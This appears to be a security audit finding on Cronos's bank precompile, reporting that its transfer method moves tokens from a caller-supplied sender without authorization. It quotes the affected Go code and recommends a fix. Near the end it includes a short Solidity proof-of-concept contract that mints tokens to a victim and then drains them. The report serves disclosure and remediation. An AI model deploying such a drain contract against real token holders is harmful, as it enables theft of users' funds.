### Title
Unauthorized Token Transfer via Missing Sender Authorization in Bank Precompile `transfer` — (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary

The bank precompile's `transfer` method accepts a caller-supplied `sender` address and moves tokens of the calling contract's denom from that address to an arbitrary recipient, without verifying that the `sender` has authorized the transfer or that `contract.Caller()` equals `sender`. Any deployed EVM contract can therefore drain the bank-module balances of any user who holds tokens denominated under that contract's address.

### Finding Description

The `TransferMethodName` branch of `BankContract.Run` unpacks three arguments — `sender`, `recipient`, `amount` — and derives the denom from the EVM caller:

```go
sender    := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
from      := sdk.AccAddress(sender.Bytes())
to        := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller()) // tied to calling contract
amt       := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no guard of the form `contract.Caller() == sender` and no allowance/approval check before `bankKeeper.SendCoins` is invoked. The `mint` path (lines 136–142) correctly restricts minting to the module account and then sends to the recipient, but the `transfer` path imposes no equivalent restriction on who the `from` address may be. [2](#0-1) 

The analog to the external report is direct: `cleanUpOrders()` modified state without requiring the caller to be the authorised controller; here, `transfer` moves funds without requiring the caller to be the authorised spender of `sender`'s balance.

### Impact Explanation

**Critical — Unauthorized transfer of CRC20/bank-module assets.**

An attacker who controls a contract at address `X` can:

1. Mint tokens (denom `EVMDenom(X)`) to arbitrary users via the `mint` path (which is legitimately open to any contract for its own denom).
2. Later call `transfer(victim, attacker, balance)` from the same contract.
3. `bankKeeper.SendCoins` executes unconditionally, moving the victim's entire balance to the attacker.

Because the denom is scoped to the calling contract's address, the attacker cannot steal tokens of a *different* contract's denom. However, within the attacker's own token, every holder is fully exposed to a rug-pull with no on-chain recourse. This satisfies the "unauthorized transfer of CRC20 assets" criterion in the allowed Critical impact scope.

### Likelihood Explanation

Any unprivileged user can deploy an EVM contract on Cronos and immediately call the bank precompile. No admin key, governance vote, or special permission is required. The only precondition is that victims hold a balance of the attacker's token, which the attacker can engineer by distributing the token through a DeFi scheme before executing the drain.

### Recommendation

Add a caller-equality guard before `bankKeeper.SendCoins` in the `TransferMethodName` branch:

```go
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller must equal sender")
}
```

Alternatively, model the transfer after the ERC-20 allowance pattern: require an explicit on-chain approval from `sender` to `contract.Caller()` before permitting the move. [3](#0-2) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(address recipient, uint256 amount) external returns (bool);
}

contract BankDrain {
    IBankPrecompile constant BANK = IBankPrecompile(0x0000000000000000000000000000000000000804);

    // Step 1: attacker mints tokens to victim (e.g. as part of a yield scheme)
    function seedVictim(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: attacker drains victim's balance — no approval needed
    function drain(address victim, uint256 amount) external {
        // denom = EVMDenom(address(this)); victim holds this denom
        BANK.transfer(victim, msg.sender, amount);
    }
}
```

`drain` succeeds because `BankContract.Run` calls `bankKeeper.SendCoins(ctx, victim, attacker, amt)` with no authorization check on `victim`. [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L112-156)
```go
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
